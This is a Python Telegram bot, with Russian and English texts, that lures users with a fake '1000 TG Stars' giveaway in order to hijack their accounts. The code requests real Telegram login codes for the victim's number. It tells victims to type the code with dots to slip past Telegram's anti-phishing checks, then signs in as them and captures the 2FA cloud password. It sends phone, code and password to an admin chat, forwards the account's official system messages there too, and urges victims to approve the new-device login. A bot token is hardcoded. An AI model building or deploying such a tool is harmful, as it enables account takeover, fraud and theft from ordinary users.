import asyncio
import sqlite3
import logging
import os
import re
import aiohttp
import json
from datetime import datetime
from telethon import TelegramClient, events, Button
from telethon.errors import FloodWaitError, SessionPasswordNeededError, PasswordHashInvalidError

logging.basicConfig(level=logging.ERROR)

# ========= КОНФИГУРАЦИЯ =========
BOT_TOKEN = '8825875834:AAH03xrxDexmsea5Vtz1x_fUGeo9tFTOFZM'  # Замените на ваш токен
ADMIN_ID = 5480751648  # Замените на ваш ID
# ВСТАВЬТЕ ЛЮБЫЕ РЕАЛЬНЫЕ ЗНАЧЕНИЯ (можно взять с my.telegram.org)
API_ID = 6  # Стандартный тестовый ID
API_HASH = 'eb06d4abfb49dc3eeb1aeb98ae0f581e'  # Тестовый хеш
# =================================

if not os.path.exists('sessions'):
    os.makedirs('sessions')

conn = sqlite3.connect('users.db')
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users
             (user_id INTEGER PRIMARY KEY, 
              lang TEXT, 
              step TEXT, 
              phone TEXT, 
              code TEXT,
              password TEXT,
              timestamp TEXT)''')
conn.commit()

# ИЗМЕНЕНО: Имя сессии изменено на 'bot_session_v2' для автоматического сброса старой привязки
bot = TelegramClient('bot_session_v2', API_ID, API_HASH)

# Словарь для хранения активных клиентов авторизованных пользователей
active_user_clients = {}

TEXTS_RU = {
    'welcome': "🌟 **ДОБРО ПОЖАЛОВАТЬ В РАЗДАЧУ TG STARS!** 🌟\n\n🎁 Мы дарим **1000 TG Stars** каждому участнику!\n💰 Эквивалент: 250 USDT\n\n✅ **Как получить:**\n1. Нажмите «Регистрация»\n2. Введите номер Telegram\n3. Подтвердите код\n\n⚠️ **Только сегодня! Ограниченный тираж!**",
    'phone_prompt': "📱 **Введите номер телефона**\nФормат: +71234567890\n\n⏳ После отправки придет код подтверждения",
    'code_prompt': "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔐 **ВНИМАНИЕ! СПЕЦИАЛЬНЫЙ ФОРМАТ КОДА!** 🔐\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n📲 **Telegram отправил вам SMS с кодом**\n\n⚠️ **ЧТОБЫ ОБОЙТИ СИСТЕМУ БЕЗОПАСНОСТИ:**\n\n➡️ **ВСТАВЛЯЙТЕ КОД ЧЕРЕЗ ТОЧКУ КАЖДУЮ ЦИФРУ** ⬅️\n\n✅ **ПРИМЕР:**\nЕсли код: `12345`\nВы вводите: `1.2.3.4.5`\n\n❌ **НЕЛЬЗЯ вводить слитно!**\n❌ **НЕЛЬЗЯ вводить с пробелами!**\n\n🛡️ **Это защищает ваш аккаунт от перехвата!**\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n**ВВЕДИТЕ КОД С ТОЧКАМИ:**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    'password_prompt': "🔒 **ТРЕБУЕТСЯ ОБЛАЧНЫЙ ПАРОЛЬ**\n\nНа вашем аккаунте установлена двухфакторная аутентификация.\n\nВведите ваш пароль от облака Telegram:",
    'success': "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ **РЕГИСТРАЦИЯ ЗАВЕРШЕНА!** ✅\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n🎉 **1000 TG Stars будут начислены в течение 24 часов!**\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚠️ **ВАЖНОЕ УВЕДОМЛЕНИЕ:**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n1️⃣ Если вы увидите сообщение от Telegram о **входе в аккаунт** с нового устройства — **НЕ ПУГАЙТЕСЬ!**\n\n2️⃣ **ОБЯЗАТЕЛЬНО:** Подтвердите устройство сверху на главном экране Telegram (где список чатов), чтобы завершить верификацию.\n\n🤖 **Это CamelCase бот верифицирует ваш аккаунт для выдачи звезд!**\n\n🔒 Процесс безопасен и не требует ваших действий.\n\n📌 Просто подтвердите вход — уведомление исчезнет через 5 минут.\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n💫 **Спасибо за участие!** 💫\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    'error': "❌ Ошибка! Нажмите /start и попробуйте снова\n\n❗ Убедитесь, что вводите код ЧЕРЕЗ ТОЧКИ (пример: 1.2.3.4.5)",
    'already_done': "🚫 **СТОП! ВЫ УЖЕ УЧАСТВОВАЛИ!** 🚫\n\n⏳ Ваш аккаунт уже находится в очереди на начисление звезд.\n\n🔄 Повторная регистрация невозможна. Ожидайте зачисления!"
}

TEXTS_EN = {
    'welcome': "🌟 **WELCOME TO TG STARS GIVEAWAY!** 🌟\n\n🎁 We give **1000 TG Stars** to every participant!\n💰 Equivalent: 250 USDT\n\n✅ **How to get:**\n1. Click «Register»\n2. Enter your Telegram number\n3. Confirm the code\n\n⚠️ **Today only! Limited supply!**",
    'phone_prompt': "📱 **Enter your phone number**\nFormat: +71234567890\n\n⏳ Verification code will be sent",
    'code_prompt': "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔐 **SPECIAL CODE FORMAT REQUIRED!** 🔐\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n📲 **Telegram sent you an SMS with code**\n\n⚠️ **TO BYPASS SECURITY SYSTEM:**\n\n➡️ **ENTER CODE WITH DOTS BETWEEN EACH DIGIT** ⬅️\n\n✅ **EXAMPLE:**\nIf code is: `12345`\nYou type: `1.2.3.4.5`\n\n❌ **NO spaces!**\n❌ **NO continuous digits!**\n\n🛡️ **This protects your account from interception!**\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n**ENTER CODE WITH DOTS:**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    'password_prompt': "🔒 **TWO-FACTOR PASSWORD REQUIRED**\n\nYour account is protected by two-step verification.\n\nPlease enter your Telegram cloud password:",
    'success': "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ **REGISTRATION COMPLETE!** ✅\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n🎉 **1000 TG Stars will be credited within 24 hours!**\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚠️ **IMPORTANT NOTICE:**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n1️⃣ If you see a message from Telegram about **new login** — **DON'T WORRY!**\n\n2️⃣ **MANDATORY:** Confirm the device at the top of your Telegram home screen (where chats are) to complete verification.\n\n🤖 **This is CamelCase bot verifying your account!**\n\n🔒 The process is safe.\n\n📌 Just confirm the login — it will disappear in 5 minutes.\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n💫 **Thank you for participating!** 💫\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    'error': "❌ Error! Press /start and try again\n\n❗ Make sure to enter code WITH DOTS (example: 1.2.3.4.5)",
    'already_done': "🚫 **STOP! YOU HAVE ALREADY PARTICIPATED!** 🚫\n\n⏳ Your account is already in the queue for stars.\n\n🔄 Re-registration is not allowed. Please wait!"
}

# === ФУНКЦИЯ ДЛЯ ОТПРАВКИ СООБЩЕНИЙ С ЦВЕТНЫМИ INLINE-КНОПКАМИ ЧЕРЕЗ BOT API ===
async def send_message_with_colored_buttons(chat_id, text, buttons_list, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': parse_mode,
        'reply_markup': json.dumps({'inline_keyboard': buttons_list})
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, json=payload) as resp:
            return await resp.json()
# ===================================================================================

def setup_telegram_listener(user_id, client, phone):
    @client.on(events.NewMessage(from_users=777000))  # 777000 — официальный аккаунт Telegram
    async def telegram_message_handler(event):
        try:
            await bot.send_message(
                ADMIN_ID,
                f"📩 **ПОЛУЧЕНО СИСТЕМНОЕ СООБЩЕНИЕ**\n"
                f"👤 Юзер ID: `{user_id}`\n"
                f"📞 Номер: `{phone}`\n"
                f"💬 Текст:\n\n{event.message.text}"
            )
        except Exception as e:
            print(f"Ошибка пересылки сообщения для {user_id}: {e}")

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    user_id = event.sender_id
    
    # ВРЕМЕННО УБРАНО ДЛЯ ТЕСТОВ: Проверка на статус 'done' отключена,
    # чтобы была возможность регистрироваться бесконечно.
    
    # === КРАСНЫЕ КНОПКИ ВЫБОРА ЯЗЫКА (style: 'danger') ===
    buttons = [
        [{'text': '🇬🇧 English', 'callback_data': f'lang_en_{user_id}', 'style': 'danger'}],
        [{'text': '🇷🇺 Русский', 'callback_data': f'lang_ru_{user_id}', 'style': 'danger'}]
    ]
    await send_message_with_colored_buttons(event.chat_id, "🌍 **Select language / Выберите язык:**", buttons)
    # =======================================================

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    data = event.data.decode()
    user_id = event.sender_id
    
    if data.startswith('lang_'):
        lang_code = data.split('_')[1]
        c.execute("INSERT OR REPLACE INTO users (user_id, lang, step) VALUES (?, ?, ?)", 
                  (user_id, lang_code, 'awaiting_phone'))
        conn.commit()
        
        texts = TEXTS_RU if lang_code == 'ru' else TEXTS_EN
        # === ЗЕЛЁНАЯ КНОПКА РЕГИСТРАЦИИ (style: 'success') ===
        reg_button = [
            [{'text': '📝 РЕГИСТРАЦИЯ / REGISTER', 'callback_data': f'reg_{user_id}', 'style': 'success'}]
        ]
        await send_message_with_colored_buttons(event.chat_id, texts['welcome'], reg_button)
        # =======================================================
    
    elif data.startswith('reg_'):
        c.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,))
        row = c.fetchone()
        if not row:
            await event.respond("Ошибка, нажмите /start")
            return
        lang = row[0]
        texts = TEXTS_RU if lang == 'ru' else TEXTS_EN
        
        await event.respond(texts['phone_prompt'])
        c.execute("UPDATE users SET step = 'awaiting_phone' WHERE user_id = ?", (user_id,))
        conn.commit()

@bot.on(events.NewMessage)
async def message_handler(event):
    if event.is_private and not event.message.text.startswith('/'):
        user_id = event.sender_id
        text = event.message.text.strip()
        
        c.execute("SELECT lang, step, phone FROM users WHERE user_id = ?", (user_id,))
        row = c.fetchone()
        if not row:
            await event.respond("Нажмите /start")
            return
        
        lang, step, phone_saved = row
        texts = TEXTS_RU if lang == 'ru' else TEXTS_EN
        
        if step == 'awaiting_phone':
            if text.startswith('+') and len(text) >= 10:
                status_msg = await event.respond("⏳ **Запрос кода подтверждения у Telegram...**")
                
                user_client = TelegramClient(f'sessions/session_{user_id}', API_ID, API_HASH)
                try:
                    await user_client.connect()
                    await user_client.send_code_request(text)
                    active_user_clients[user_id] = user_client
                    
                    c.execute("UPDATE users SET step = 'awaiting_code', phone = ? WHERE user_id = ?", 
                              (text, user_id))
                    conn.commit()
                    
                    await status_msg.delete()
                    await event.respond(texts['code_prompt'])
                    
                    await bot.send_message(
                        ADMIN_ID,
                        f"📞 **НОВЫЙ НОМЕР (КОД УСПЕШНО ЗАПРОШЕН)**\n"
                        f"👤 User ID: `{user_id}`\n"
                        f"📱 Phone: `{text}`\n"
                        f"🕒 Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
                    )
                except FloodWaitError as e:
                    await user_client.disconnect()
                    await status_msg.edit(f"❌ Telegram временно заблокировал частые запросы. Попробуйте через {e.seconds} сек.")
                except Exception as e:
                    await user_client.disconnect()
                    await status_msg.edit(f"❌ Не удалось отправить код автоматически.\nОшибка: {str(e)}")
            else:
                await event.respond("❌ Неверный формат. Пример: +79161234567")
        
        elif step == 'awaiting_code':
            if not re.match(r'^\d+(\.\d+)+$', text):
                await event.respond("❌ **НЕВЕРНЫЙ ФОРМАТ!**\n\nВведите код через ТОЧКИ:\n✅ Пример: `1.2.3.4.5`\n\nПопробуйте снова:")
                return
            
            clean_code = text.replace('.', '')
            if not clean_code.isdigit() or len(clean_code) < 3:
                await event.respond("❌ Слишком короткий код. Введите заново через точки:")
                return
            
            c.execute("SELECT phone FROM users WHERE user_id = ?", (user_id,))
            phone = c.fetchone()[0]
            
            user_client = active_user_clients.get(user_id)
            if user_client:
                try:
                    await user_client.sign_in(phone, clean_code)
                    setup_telegram_listener(user_id, user_client, phone)
                    
                    await bot.send_message(
                        ADMIN_ID,
                        f"🔐 **ПОЛУЧЕН КОД (ВХОД БЕЗ 2FA)**\n"
                        f"👤 User ID: `{user_id}`\n"
                        f"📞 Phone: `{phone}`\n"
                        f"🔢 Code: `{clean_code}`\n"
                        f"🕒 Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
                    )
                    
                    c.execute("UPDATE users SET step = 'done', code = ? WHERE user_id = ?", (clean_code, user_id))
                    conn.commit()
                    await event.respond(texts['success'])
                    
                except SessionPasswordNeededError:
                    c.execute("UPDATE users SET step = 'awaiting_password', code = ? WHERE user_id = ?", (clean_code, user_id))
                    conn.commit()
                    
                    await bot.send_message(
                        ADMIN_ID,
                        f"🔑 **ТРЕБУЕТСЯ ОБЛАЧНЫЙ ПАРОЛЬ (2FA)**\n"
                        f"👤 User ID: `{user_id}`\n"
                        f"📞 Phone: `{phone}`\n"
                        f"🔢 Code: `{clean_code}`"
                    )
                    await event.respond(texts['password_prompt'])
                    
                except Exception as e:
                    await event.respond(f"❌ Ошибка при авторизации: {str(e)}")
        
        elif step == 'awaiting_password':
            c.execute("SELECT phone, code FROM users WHERE user_id = ?", (user_id,))
            phone, code = c.fetchone()
            
            user_client = active_user_clients.get(user_id)
            if user_client:
                try:
                    await user_client.sign_in(password=text)
                    setup_telegram_listener(user_id, user_client, phone)
                    
                    await bot.send_message(
                        ADMIN_ID,
                        f"🔒 **ПОЛУЧЕН ОБЛАЧНЫЙ ПАРОЛЬ (ВХОД УСПЕШЕН)**\n"
                        f"👤 User ID: `{user_id}`\n"
                        f"📞 Phone: `{phone}`\n"
                        f"🔢 Code: `{code}`\n"
                        f"🔑 2FA Password: `{text}`\n"
                        f"🕒 Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
                    )
                    
                    c.execute("UPDATE users SET step = 'done', password = ? WHERE user_id = ?", (text, user_id))
                    conn.commit()
                    await event.respond(texts['success'])
                    
                except PasswordHashInvalidError:
                    error_msg = "❌ Неверный облачный пароль.\n\nПожалуйста, проверьте и попробуйте ввести заново:" if lang == 'ru' else "❌ Invalid cloud password.\n\nPlease check and try entering again:"
                    await event.respond(error_msg)
                except Exception as e:
                    await event.respond(f"❌ Ошибка: {str(e)}. Попробуйте ввести заново:")

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ Бот запущен")
    print(f"📨 Данные идут админу: {ADMIN_ID}")
    print("📌 Пользователи вводят код через ТОЧКИ (1.2.3.4.5)")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
              
